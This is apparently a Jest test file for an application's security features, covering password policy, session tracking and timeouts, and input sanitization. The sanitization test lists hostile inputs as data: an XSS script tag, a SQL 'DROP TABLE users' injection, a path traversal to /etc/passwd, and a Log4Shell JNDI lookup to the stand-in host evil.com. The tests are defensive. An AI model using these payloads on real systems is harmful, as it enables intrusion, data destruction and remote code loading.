import { PasswordPolicyService } from '@/lib/auth/password-policy';
import { SessionSecurityService } from '@/lib/auth/session-security';
import { sanitizeInput } from '@/lib/sanitize';

describe('Security Hardening', () => {
  it('password policy validation', () => {
    const weakPassword = '123456';
    const strongPassword = 'SecureP@ssw0rd2024!';

    const weakResult = PasswordPolicyService.validatePassword(weakPassword);
    expect(weakResult.isValid).toBe(false);
    expect(weakResult.errors.length).toBeGreaterThan(0);

    const strongResult = PasswordPolicyService.validatePassword(strongPassword);
    expect(strongResult.isValid).toBe(true);
    expect(strongResult.errors.length).toBe(0);
  });

  it('tracks and reads session activity timestamps', () => {
    SessionSecurityService.touchActivity();
    const lastActivity = SessionSecurityService.getLastActivity();
    expect(lastActivity).toBeGreaterThan(Date.now() - 5_000);
  });

  it('invalidates sessions without throwing', () => {
    expect(() =>
      SessionSecurityService.invalidateAllSessions('user-1')
    ).not.toThrow();
  });

  it('prevents common security attacks via sanitizeInput', () => {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '"; DROP TABLE users; --',
      '../../etc/passwd',
      '${jndi:ldap://evil.com}',
    ];

    maliciousInputs.forEach((input) => {
      const sanitized = sanitizeInput(input);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized.toLowerCase()).not.toContain('drop table');
      expect(sanitized).not.toContain('../');
      expect(sanitized).not.toContain('${jndi:');
    });
  });

  it('exposes expected session timeout constants', () => {
    expect(SessionSecurityService.SESSION_TIMEOUT).toBe(24 * 60 * 60 * 1000);
    expect(SessionSecurityService.IDLE_TIMEOUT).toBe(2 * 60 * 60 * 1000);
    expect(SessionSecurityService.REFRESH_THRESHOLD).toBe(5 * 60 * 1000);
  });
});
